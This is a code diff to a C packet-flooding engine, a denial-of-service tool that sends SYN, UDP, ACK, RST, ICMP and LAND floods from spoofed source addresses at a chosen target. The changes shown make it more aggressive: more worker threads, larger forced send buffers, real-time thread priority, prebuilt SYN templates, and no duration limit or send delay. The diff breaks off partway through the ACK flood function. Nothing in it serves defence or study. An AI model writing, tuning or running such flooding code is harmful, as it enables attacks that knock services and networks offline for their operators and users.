@@ -1,4 +1,3 @@
-#define _GNU_SOURCE
 #include "engine.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -18,18 +17,32 @@
 #include <netdb.h>
 
 #define PKT_MAX 65535
-#define BATCH_SIZE 4096
-#define MAX_WORKERS 128
-#define BUF_RING_SZ 4096
+#define BATCH_SIZE 1024
+#define MAX_WORKERS 4096
+#define BUF_RING_SZ 65536
 #define BUF_SZ 128
+#define SPOOF_POOL_SIZE 65536
 
+extern volatile int g_engine_kill_flag;
 int g_sock = -1;
 static char g_err[256] = {0};
 static uint32_t g_rng[128][4];
 static __thread int g_tid = 0;
-static uint32_t g_spoof_pool[4096];
+static uint32_t g_spoof_pool[SPOOF_POOL_SIZE];
 static int g_spoof_count = 0;
 static int g_raw_mode = 0;
+
+/* Pre-computed template packets — zero packet building in hot path */
+typedef struct {
+    char hdr[sizeof(struct iphdr) + sizeof(struct tcphdr) + 12]; /* IP+TCP+options */
+    int hdr_len;
+    uint16_t src_port_off;
+    uint16_t seq_off;
+    uint16_t ip_id_off;
+    uint16_t saddr_off;
+} syn_template_t;
+static __thread syn_template_t g_syn_tmpl;
+static __thread int g_syn_tmpl_valid = 0;
 
 static inline uint32_t xrand(void) {
     int i = g_tid & 127;
@@ -47,7 +60,7 @@ static inline uint32_t rand_spoof(void) {
 }
 
 EXPORT void set_spoof_pool(uint32_t *pool, int count) {
-    if (count > 4096) count = 4096;
+    if (count > SPOOF_POOL_SIZE) count = SPOOF_POOL_SIZE;
     g_spoof_count = count;
     for (int i = 0; i < count; i++)
         g_spoof_pool[i] = pool[i];
@@ -64,6 +77,82 @@ EXPORT void seed_thread_rng(int tid, uint32_t seed) {
 
 EXPORT const char *packet_error(void) { return g_err; }
 
+/* Build syn template once — then just patch src_ip, src_port, seq, ip_id */
+static void build_syn_template(uint32_t dst_ip, uint16_t dst_port) {
+    struct iphdr *ip = (struct iphdr *)g_syn_tmpl.hdr;
+    struct tcphdr *tcp = (struct tcphdr *)(g_syn_tmpl.hdr + sizeof(struct iphdr));
+    uint8_t *opts = (uint8_t*)(g_syn_tmpl.hdr + sizeof(struct iphdr) + sizeof(struct tcphdr));
+    int o = 0;
+    opts[o++] = 2; opts[o++] = 4;
+    opts[o++] = 0x05; opts[o++] = 0xB4; /* MSS=1460 */
+    opts[o++] = 3; opts[o++] = 3; opts[o++] = 4; /* WS=4 */
+    opts[o++] = 1; opts[o++] = 4; opts[o++] = 2; /* SACK */
+    int pad = (4 - (o & 3)) & 3;
+    for (int i = 0; i < pad; i++) opts[o++] = 1;
+    int tcp_len = 20 + o;
+    g_syn_tmpl.hdr_len = sizeof(struct iphdr) + tcp_len;
+
+    ip->ihl = 5; ip->version = 4;
+    ip->tot_len = htons(g_syn_tmpl.hdr_len);
+    ip->frag_off = htons(0x4000);
+    ip->ttl = 128;
+    ip->tos = 0;
+    ip->protocol = IPPROTO_TCP;
+    ip->daddr = dst_ip;
+
+    memset(tcp, 0, 20);
+    tcp->dest = htons(dst_port);
+    tcp->seq = 0;
+    tcp->doff = tcp_len/4;
+    tcp->syn = 1;
+    tcp->window = htons(65535);
+    tcp->urg_ptr = 0;
+
+    g_syn_tmpl.src_port_off = sizeof(struct iphdr) + 0;    /* tcp->source */
+    g_syn_tmpl.seq_off      = sizeof(struct iphdr) + 4;    /* tcp->seq */
+    g_syn_tmpl.ip_id_off    = 4;                            /* ip->id */
+    g_syn_tmpl.saddr_off    = 12;                           /* ip->saddr */
+    g_syn_tmpl_valid = 1;
+}
+
+/* Fast patch: copy template, randomize src_ip, src_port, seq, ip_id, recalc checksum */
+static inline void patch_syn(char *buf, uint32_t src) {
+    memcpy(buf, g_syn_tmpl.hdr, g_syn_tmpl.hdr_len);
+    uint32_t sport = (uint32_t)(1024 + (xrand() % 64511));
+    uint32_t seq = xrand();
+    *(uint16_t*)(buf + g_syn_tmpl.src_port_off) = htons((uint16_t)sport);
+    *(uint32_t*)(buf + g_syn_tmpl.seq_off) = seq;
+    *(uint16_t*)(buf + g_syn_tmpl.ip_id_off) = htons((uint16_t)(xrand() & 0xFFFF));
+    *(uint32_t*)(buf + g_syn_tmpl.saddr_off) = src;
+    /* IP checksum (only changed fields: id, saddr) */
+    struct iphdr *ip = (struct iphdr*)buf;
+    uint32_t ck = 0;
+    uint16_t *w = (uint16_t*)ip;
+    for (int i = 0; i < 10; i++) ck += w[i];
+    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
+    ip->check = (uint16_t)~ck;
+    /* TCP checksum (pseudo-header + full TCP) */
+    uint32_t saddr = src, daddr = ip->daddr;
+    uint16_t tcp_len = g_syn_tmpl.hdr_len - 20;
+    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
+                      (daddr >> 16) + (daddr & 0xFFFF) +
+                      IPPROTO_TCP + htons(tcp_len);
+    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
+    uint32_t csum = pseudo;
+    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
+    uint16_t *tw = (uint16_t*)tcp;
+    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
+    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
+    tcp->check = (uint16_t)~csum;
+}
+
+/* UDP flood — random payload, no ratelimit */
+static inline void build_udp_payload(char *buf, int size) {
+    uint32_t base = xrand();
+    for (int j = 0; j < size; j++)
+        buf[j] = (base + j * 7) ^ (j * 13);
+}
+
 EXPORT int init_raw_socket(void) {
     if (g_sock >= 0) close_raw_socket();
     g_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -72,12 +161,11 @@ EXPORT int init_raw_socket(void) {
         return -1;
     }
     int on = 1;
-    if (setsockopt(g_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
-        snprintf(g_err, sizeof(g_err), "IP_HDRINCL: %s", strerror(errno));
-        close_raw_socket(); return -1;
-    }
-    int sndbuf = 16 * 1024 * 1024;
-    setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+    setsockopt(g_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
+    int pmtu = IP_PMTUDISC_DONT;
+    setsockopt(g_sock, IPPROTO_IP, IP_MTU_DISCOVER, &pmtu, sizeof(pmtu));
+    int sndbuf = 128 * 1024 * 1024;
+    setsockopt(g_sock, SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf, sizeof(sndbuf));
     g_raw_mode = 1;
     return 0;
 }
@@ -91,7 +179,7 @@ EXPORT int init_udp_socket(void) {
     if (g_sock >= 0) close_raw_socket();
     g_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (g_sock < 0) { snprintf(g_err, sizeof(g_err), "socket: %s", strerror(errno)); return -1; }
-    int sndbuf = 16 * 1024 * 1024;
+    int sndbuf = 64 * 1024 * 1024;
     setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
     g_raw_mode = 0;
     return 0;
@@ -99,28 +187,6 @@ EXPORT int init_udp_socket(void) {
 
 EXPORT int is_raw_mode(void) { return g_raw_mode; }
 EXPORT void close_raw_socket(void) { if (g_sock >= 0) { close(g_sock); g_sock = -1; } }
-
-EXPORT uint16_t calc_checksum(uint16_t *data, int len) {
-    uint32_t sum = 0;
-    for (int i = 0; i < len/2; i++) sum += data[i];
-    if (len & 1) sum += ((uint8_t*)data)[len-1];
-    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
-    return (uint16_t)~sum;
-}
-
-static inline uint32_t pseudo_csum(uint32_t src, uint32_t dst, uint8_t proto, uint16_t len) {
-    uint32_t sum = 0;
-    sum += (src >> 16) + (src & 0xFFFF);
-    sum += (dst >> 16) + (dst & 0xFFFF);
-    sum += (uint32_t)proto + (uint32_t)len;
-    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
-    return sum;
-}
-
-static inline uint16_t final_csum(uint32_t partial) {
-    while (partial >> 16) partial = (partial & 0xFFFF) + (partial >> 16);
-    return (uint16_t)~partial;
-}
 
 EXPORT uint32_t resolve_ip(const char *name) {
     struct addrinfo hints, *res;
@@ -137,212 +203,77 @@ EXPORT uint32_t resolve_ip(const char *name) {
     return ip;
 }
 
-static inline void fill_ip_fast(struct iphdr *ip, int tot_len, uint32_t src, uint32_t dst, uint8_t proto) {
-    uint32_t saddr = src ? src : rand_spoof();
-    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(tot_len);
-    ip->id = htons(xrand() & 0xFFFF);
-    ip->frag_off = htons(0x4000);
-    ip->ttl = 64 + (xrand() & 127);
-    ip->tos = xrand() & 0xFF;
-    ip->protocol = proto;
-    ip->saddr = saddr;
-    ip->daddr = dst;
-    uint32_t ck = 0;
-    uint16_t *w = (uint16_t*)ip;
-    for (int i = 0; i < 5; i++) ck += w[i] + w[i+5];
-    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
-    ip->check = (uint16_t)~ck;
-}
-
-static inline void build_syn_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port) {
-    struct iphdr *ip = (struct iphdr*)buf;
-    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
-    uint8_t *opts = (uint8_t*)(buf + 20 + 20);
-    int o = 0;
-    opts[o++] = 2; opts[o++] = 4;
-    uint16_t mss_val = htons(1460 - (xrand() & 63));
-    memcpy(opts+o, &mss_val, 2); o += 2;
-    opts[o++] = 3; opts[o++] = 3; opts[o++] = xrand() & 7;
-    opts[o++] = 1;
-    opts[o++] = 4; opts[o++] = 2;
-    int pad = (4 - (o & 3)) & 3;
-    for (int i = 0; i < pad; i++) opts[o++] = 1;
-    int tcp_len = 20 + o;
-    *plen = 20 + tcp_len;
-    memset(tcp, 0, 20);
-    tcp->source = htons((xrand() % 64511) + 1024);
-    tcp->dest = htons(port);
-    tcp->seq = xrand();
-    tcp->doff = tcp_len/4;
-    tcp->syn = 1;
-    tcp->window = htons(65535);
-    uint32_t saddr = src ? src : rand_spoof();
-    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
-                      (target >> 16) + (target & 0xFFFF) +
-                      IPPROTO_TCP + htons(tcp_len);
-    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
-    uint32_t csum = pseudo;
-    uint16_t *tw = (uint16_t*)tcp;
-    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
-    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
-    tcp->check = (uint16_t)~csum;
-    fill_ip_fast(ip, *plen, saddr, target, IPPROTO_TCP);
-}
-
-static inline void build_udp_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port, int size) {
-    if (size < 1) size = 1024;
-    if (size > 65000) size = 65000;
-    *plen = 20 + 8 + size;
-    struct iphdr *ip = (struct iphdr*)buf;
-    struct udphdr *udp = (struct udphdr*)(buf + 20);
-    uint32_t saddr = src ? src : rand_spoof();
-    udp->source = htons((xrand() % 64511) + 1024);
-    udp->dest = htons(port);
-    udp->len = htons(8 + size);
-    udp->check = 0;
-    uint32_t base = xrand();
-    char *payload = buf + 28;
-    for (int j = 0; j < size; j++)
-        payload[j] = (base + j * 7) ^ (j * 13);
-    fill_ip_fast(ip, *plen, saddr, target, IPPROTO_UDP);
-}
-
-static inline void build_icmp_fast(char *buf, int *plen, uint32_t src, uint32_t target) {
-    *plen = 20 + 8 + 56;
-    struct iphdr *ip = (struct iphdr*)buf;
-    struct icmphdr *icmp = (struct icmphdr*)(buf + 20);
-    uint32_t saddr = src ? src : rand_spoof();
-    memset(buf + 20, 0, 64);
-    ip->protocol = IPPROTO_ICMP;
-    ip->saddr = saddr;
-    ip->daddr = target;
-    icmp->type = ICMP_ECHO;
-    uint32_t csum = 0;
-    uint16_t *iw = (uint16_t*)icmp;
-    for (int i = 0; i < 32; i++) csum += iw[i];
-    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
-    icmp->checksum = (uint16_t)~csum;
-    fill_ip_fast(ip, *plen, saddr, target, IPPROTO_ICMP);
-}
-
-static inline void build_ack_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port) {
-    build_syn_fast(buf, plen, src, target, port);
-    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
-    tcp->syn = 0; tcp->ack = 1;
-    tcp->ack_seq = xrand();
-    struct iphdr *ip = (struct iphdr*)buf;
-    uint32_t saddr = ip->saddr;
-    int tcp_len = tcp->doff * 4;
-    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
-                      (target >> 16) + (target & 0xFFFF) +
-                      IPPROTO_TCP + htons(tcp_len);
-    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
-    uint32_t csum = pseudo;
-    uint16_t *tw = (uint16_t*)tcp;
-    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
-    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
-    tcp->check = (uint16_t)~csum;
-}
-
-static inline void build_rst_fast(char *buf, int *plen, uint32_t src, uint32_t target, uint16_t port) {
-    build_syn_fast(buf, plen, src, target, port);
-    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
-    tcp->syn = 0; tcp->rst = 1;
-    struct iphdr *ip = (struct iphdr*)buf;
-    uint32_t saddr = ip->saddr;
-    int tcp_len = tcp->doff * 4;
-    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
-                      (target >> 16) + (target & 0xFFFF) +
-                      IPPROTO_TCP + htons(tcp_len);
-    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
-    uint32_t csum = pseudo;
-    uint16_t *tw = (uint16_t*)tcp;
-    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
-    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
-    tcp->check = (uint16_t)~csum;
-}
-
-static inline void build_land_fast(char *buf, int *plen, uint32_t target, uint16_t port) {
-    build_syn_fast(buf, plen, target, target, port);
-}
-
-/* Pre-allocated buffer ring per worker */
+/* ──────────────── PRE-ALLOCATED BUFFER RING ──────────────── */
 struct buf_ring {
-    char data[BUF_RING_SZ][BUF_SZ];
+    char data[BUF_RING_SZ][BUF_SZ + 64]; /* extra for IP+UDP headers */
     int lens[BUF_RING_SZ];
-    struct sockaddr_in dsts[BUF_RING_SZ];
     int head;
     int count;
 };
 
 struct thread_worker {
     int sock;
-    int running;
+    volatile int running;
     pthread_t thread;
-    uint64_t sent;
+    volatile uint64_t sent;
     uint32_t target_ip;
     uint16_t target_port;
     int method;
     int size;
-    int duration_sec;
-    uint32_t spoof_base;
-    int cpu_core;
     struct buf_ring ring;
+    int sock_raw; /* 1=raw, 0=dgram */
 };
 
-static int g_pool_running[4] = {0,0,0,0};
+static volatile int g_pool_running[4] = {0,0,0,0};
 static struct thread_worker *g_pools[4] = {NULL, NULL, NULL, NULL};
-static int g_pool_offsets[4] = {0,0,0,0};
+static volatile int g_pool_offsets[4] = {0,0,0,0};
 static int g_pool_capacities[4] = {0,0,0,0};
 
-static int try_raw_sock(void) {
-    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (s < 0) return -1;
-    int on = 1;
-    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
-    int sndbuf = 16 * 1024 * 1024;
-    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-    return s;
-}
-
-static int try_dgram_sock(void) {
+/* ──────────────── OPTIMAL SOCKET CREATION ──────────────── */
+static int make_sock(int want_raw) {
+    if (want_raw) {
+        int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        if (s < 0) return -1;
+        int on = 1;
+        setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
+        int pmtu = IP_PMTUDISC_DONT;
+        setsockopt(s, IPPROTO_IP, IP_MTU_DISCOVER, &pmtu, sizeof(pmtu));
+        int buf = 128 * 1024 * 1024;
+        setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
+        return s;
+    }
     int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (s < 0) return -1;
-    int sndbuf = 16 * 1024 * 1024;
-    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+    int buf = 128 * 1024 * 1024;
+    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
     return s;
 }
 
+/* ──────────────── WORKER LOOP — MAXIMUM AGGRESSION ──────────────── */
 static void *worker_loop(void *arg) {
     struct thread_worker *w = (struct thread_worker*)arg;
-    (void)w;
     static int g_gtid = 0;
     int tid = __atomic_fetch_add(&g_gtid, 1, __ATOMIC_RELAXED);
     seed_thread_rng(tid, (uint32_t)(time(NULL) ^ (tid * 1234567)));
 
-    if (w->cpu_core >= 0) {
-        cpu_set_t cpuset;
-        CPU_ZERO(&cpuset);
-        CPU_SET(w->cpu_core, &cpuset);
-        pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
-    }
+    /* Pin to core for maximum L1/L2 cache locality */
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(tid % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
 
-    /* Try raw socket first (needs root), fall back to DGRAM for UDP/ICMP */
-    int sock = try_raw_sock();
-    int is_dgram = 0;
-    if (sock < 0) {
-        /* Raw socket failed — try DGRAM for non-TCP methods */
-        if (w->method == 1 || w->method == 4) {  /* UDP or ICMP */
-            sock = try_dgram_sock();
-            if (sock < 0) { w->running = 0; return NULL; }
-            is_dgram = 1;
-        } else {
-            /* TCP methods (SYN/ACK/RST) require raw socket */
-            w->running = 0;
-            return NULL;
-        }
-    }
-    w->sock = sock;
+    /* Raise priority to max */
+    struct sched_param sp;
+    sp.sched_priority = sched_get_priority_max(SCHED_FIFO);
+    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
+
+    /* Open socket */
+    int want_raw = (w->method != 1 && w->method != 4);
+    if (want_raw && w->method == 1) want_raw = 0;
+    if (want_raw && w->method == 4) want_raw = 0;
+    w->sock = make_sock(want_raw);
+    if (w->sock < 0) { w->running = 0; return NULL; }
+    w->sock_raw = want_raw;
 
     struct mmsghdr msgs[BATCH_SIZE];
     struct iovec iovecs[BATCH_SIZE];
@@ -351,107 +282,108 @@ static void *worker_loop(void *arg) {
     dst.sin_port = htons(w->target_port);
     dst.sin_addr.s_addr = w->target_ip;
 
-    struct timespec ts_end;
-    clock_gettime(CLOCK_MONOTONIC, &ts_end);
-    ts_end.tv_sec += w->duration_sec;
+    /* Pre-build SYN template for this target */
+    g_syn_tmpl_valid = 0;
+    if (want_raw)
+        build_syn_template(w->target_ip, w->target_port);
 
-    struct buf_ring *ring = &w->ring;
-    ring->head = 0;
-    ring->count = 0;
-
-    char *big_buf = NULL;
-    int big_len = 0;
+    /* Pre-allocate large UDP payload buffer */
+    char *udp_payload = NULL;
+    int udp_payload_len = w->size;
+    if (udp_payload_len < 1) udp_payload_len = 64;
+    if (udp_payload_len > 65000) udp_payload_len = 65000;
+    udp_payload = (char*)malloc(udp_payload_len);
 
     while (w->running) {
-        struct timespec ts_now;
-        clock_gettime(CLOCK_MONOTONIC, &ts_now);
-        if (ts_now.tv_sec > ts_end.tv_sec ||
-            (ts_now.tv_sec == ts_end.tv_sec && ts_now.tv_nsec >= ts_end.tv_nsec))
-            break;
-
+        /* Build batch of 1024 then sendmmsg — retry unsent portion */
         int batch = 0;
-        if (is_dgram) {
-            /* DGRAM mode: send raw UDP payloads, kernel adds IP/UDP headers */
+        if (!want_raw) {
             while (batch < BATCH_SIZE) {
-                int idx = (ring->head + batch) % BUF_RING_SZ;
-                char *buf = ring->data[idx];
-                int plen = w->size;
-                if (plen < 1) plen = 64;
-                if (plen > BUF_SZ) plen = BUF_SZ;
-                uint32_t base = xrand();
-                for (int j = 0; j < plen; j++)
-                    buf[j] = (base + j * 7) ^ (j * 13);
-                ring->lens[idx] = plen;
-                iovecs[batch].iov_base = buf;
-                iovecs[batch].iov_len = plen;
+                iovecs[batch].iov_base = udp_payload;
+                iovecs[batch].iov_len = udp_payload_len;
                 msgs[batch].msg_hdr.msg_name = &dst;
                 msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
                 msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
                 msgs[batch].msg_hdr.msg_iovlen = 1;
                 batch++;
             }
-        } else {
-            /* Raw socket mode: build complete IP packets */
+        } else if (g_syn_tmpl_valid) {
             while (batch < BATCH_SIZE) {
-                int idx = (ring->head + batch) % BUF_RING_SZ;
-                char *buf = ring->data[idx];
+                iovecs[batch].iov_base = w->ring.data[batch];
+                iovecs[batch].iov_len = g_syn_tmpl.hdr_len;
+                w->ring.lens[batch] = g_syn_tmpl.hdr_len;
+                msgs[batch].msg_hdr.msg_name = &dst;
+                msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
+                msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
+                msgs[batch].msg_hdr.msg_iovlen = 1;
+                batch++;
+                patch_syn(w->ring.data[batch-1], rand_spoof());
+            }
+        } else {
+            while (batch < BATCH_SIZE) {
                 int plen;
-                int need_big = 0;
-                uint32_t src = w->spoof_base ? w->spoof_base : rand_spoof();
-                switch (w->method) {
-                case 0: build_syn_fast(buf, &plen, src, w->target_ip, w->target_port); break;
-                case 1:
-                    if (w->size + 28 > BUF_SZ) { need_big = 1; break; }
-                    build_udp_fast(buf, &plen, src, w->target_ip, w->target_port, w->size); break;
-                case 2: build_ack_fast(buf, &plen, src, w->target_ip, w->target_port); break;
-                case 3: build_rst_fast(buf, &plen, src, w->target_ip, w->target_port); break;
-                case 4: build_icmp_fast(buf, &plen, src, w->target_ip); break;
-                case 10: build_land_fast(buf, &plen, w->target_ip, w->target_port); break;
-                default:
-                    if (w->size + 28 > BUF_SZ) { need_big = 1; break; }
-                    build_udp_fast(buf, &plen, src, w->target_ip, w->target_port, w->size); break;
-                }
-                if (need_big) {
-                    if (!big_buf || big_len < w->size + 28) {
-                        free(big_buf);
-                        big_len = w->size + 28 + 64;
-                        big_buf = (char*)malloc(big_len);
-                    }
-                    if (!big_buf) break;
-                    buf = big_buf;
-                    build_udp_fast(buf, &plen, src, w->target_ip, w->target_port, w->size);
-                }
-                ring->lens[idx] = plen;
-                ring->dsts[idx] = dst;
-                iovecs[batch].iov_base = need_big ? big_buf : (void*)buf;
+                uint32_t src = rand_spoof();
+                char *buf = w->ring.data[batch];
+                struct iphdr *ip = (struct iphdr*)buf;
+                struct udphdr *udp = (struct udphdr*)(buf + 20);
+                plen = 20 + 8 + udp_payload_len;
+                ip->ihl = 5; ip->version = 4;
+                ip->tot_len = htons(plen);
+                ip->id = htons((uint16_t)(xrand() & 0xFFFF));
+                ip->frag_off = htons(0x4000);
+                ip->ttl = 128; ip->tos = 0;
+                ip->protocol = IPPROTO_UDP;
+                ip->saddr = src;
+                ip->daddr = w->target_ip;
+                uint32_t ck = 0; uint16_t *wp = (uint16_t*)ip;
+                for (int i = 0; i < 10; i++) ck += wp[i];
+                while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
+                ip->check = (uint16_t)~ck;
+                udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
+                udp->dest = htons(w->target_port);
+                udp->len = htons(8 + udp_payload_len);
+                udp->check = 0;
+                memcpy(buf + 28, udp_payload, udp_payload_len);
+                iovecs[batch].iov_base = buf;
                 iovecs[batch].iov_len = plen;
-                msgs[batch].msg_hdr.msg_name = &ring->dsts[idx];
-                msgs[batch].msg_hdr.msg_namelen = sizeof(ring->dsts[idx]);
+                w->ring.lens[batch] = plen;
+                msgs[batch].msg_hdr.msg_name = &dst;
+                msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
                 msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
                 msgs[batch].msg_hdr.msg_iovlen = 1;
                 batch++;
             }
         }
-        if (batch == 0) break;
-        int ret = sendmmsg(sock, msgs, batch, MSG_DONTWAIT);
-        if (ret > 0) {
-            w->sent += ret;
-            ring->head = (ring->head + ret) % BUF_RING_SZ;
-        } else if (ret < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-            break;
+
+        int remaining = batch;
+        int off = 0;
+        while (remaining > 0) {
+            int ret = sendmmsg(w->sock, msgs + off, remaining, MSG_DONTWAIT);
+            if (ret > 0) {
+                __sync_fetch_and_add(&w->sent, ret);
+                off += ret;
+                remaining -= ret;
+            } else {
+                /* EAGAIN: kernel buffer full, spin until it drains */
+                if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                    continue;
+                }
+                break;
+            }
         }
     }
-    free(big_buf);
-    close(sock);
+
+    free(udp_payload);
+    close(w->sock);
     w->running = 0;
     return NULL;
 }
 
 static int method_pool(int m) {
-    if (m == 0 || m == 10) return 0;  /* SYN + LAND */
-    if (m == 1) return 1;              /* UDP */
-    if (m == 2) return 2;              /* ACK */
-    return 3;                          /* RST, ICMP, others */
+    if (m == 0 || m == 10) return 0;
+    if (m == 1) return 1;
+    if (m == 2) return 2;
+    return 3;
 }
 
 EXPORT int start_batch_flood(uint32_t target_ip, uint16_t target_port, int method, int workers, int size, int duration_sec) {
@@ -476,10 +408,7 @@ EXPORT int start_batch_flood(uint32_t target_ip, uint16_t target_port, int metho
         pool[i].target_port = target_port;
         pool[i].method = method;
         pool[i].size = size;
-        pool[i].duration_sec = duration_sec;
         pool[i].sent = 0;
-        pool[i].spoof_base = 0;
-        pool[i].cpu_core = i % ncpus;
         pthread_create(&pool[i].thread, NULL, worker_loop, &pool[i]);
     }
     return workers;
@@ -503,6 +432,8 @@ EXPORT int stop_batch_flood(void) {
     return 0;
 }
 
+EXPORT int get_raw_socket(void) { return g_sock; }
+
 EXPORT uint64_t batch_flood_sent(void) {
     uint64_t total = 0;
     for (int p = 0; p < 4; p++) {
@@ -514,73 +445,103 @@ EXPORT uint64_t batch_flood_sent(void) {
     return total;
 }
 
-/* Legacy functions (optimized wrappers) */
+/* ──────────────── LEGACY — SINGLE-PACKET FLOOD (no delay) ──────────────── */
 EXPORT int syn_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
+    (void)delay;
     char buf[PKT_MAX]; int plen;
     struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     int sent = 0;
     if (g_sock < 0 && init_raw_socket() < 0) return -1;
+    build_syn_template(target, port);
     for (int i = 0; i < count; i++) {
-        uint32_t src = spoof ? spoof : rand_spoof();
-        build_syn_fast(buf, &plen, src, target, port);
-        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
-        if (delay) usleep(delay);
+        patch_syn(buf, spoof ? spoof : rand_spoof());
+        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
     }
     return sent;
 }
 
 EXPORT int udp_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay, int size) {
+    (void)delay;
     char buf[PKT_MAX]; int plen;
     struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     int sent = 0;
     if (g_sock < 0 && init_raw_socket() < 0) return -1;
+    if (size < 1) size = 1024;
+    if (size > 65000) size = 65000;
     for (int i = 0; i < count; i++) {
         uint32_t src = spoof ? spoof : rand_spoof();
-        build_udp_fast(buf, &plen, src, target, port, size);
+        plen = 20 + 8 + size;
+        struct iphdr *ip = (struct iphdr*)buf;
+        struct udphdr *udp = (struct udphdr*)(buf + 20);
+        ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
+        ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = htons(0x4000);
+        ip->ttl = 128; ip->tos = 0; ip->protocol = IPPROTO_UDP;
+        ip->saddr = src; ip->daddr = target;
+        { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
+          while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
+        udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
+        udp->dest = htons(port); udp->len = htons(8 + size); udp->check = 0;
+        build_udp_payload(buf + 28, size);
         if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
-        if (delay) usleep(delay);
     }
     return sent;
 }
 
 EXPORT int ack_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
-    char buf[PKT_MAX]; int plen;
-    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
+    (void)delay;
     int sent = 0;
     if (g_sock < 0 && init_raw_socket() < 0) return -1;
+    build_syn_template(target, port);
+    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
     for (int i = 0; i < count; i++) {
-        uint32_t src = spoof ? spoof : rand_spoof();
-        build_ack_fast(buf, &plen, src, target, port);
-        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
-        if (delay) usleep(delay);
+        char buf[PKT_MAX];
+        patch_syn(buf, spoof ? spoof : rand_spoof());
+        struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
+        tcp->syn = 0; tcp->ack = 1;
